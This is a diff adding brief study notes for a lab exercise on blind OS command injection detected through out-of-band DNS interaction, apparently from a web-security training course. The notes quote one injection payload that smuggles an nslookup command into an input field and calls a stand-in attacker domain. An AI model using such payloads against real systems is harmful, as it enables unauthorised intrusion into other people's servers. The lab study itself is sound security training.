@@ -1,0 +1,16 @@
+Lab #4 - Blind OS command injection with out-of-band interaction
+
+Target Goal - Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator
+
+Analysis - 
+
+External server of our control: https://www.myserver.com
+
+
+Reading Materials - 
+
+You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
+
+    '& nslookup kgji2ohoyw.web-attacker.com &'
+
+This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected. 
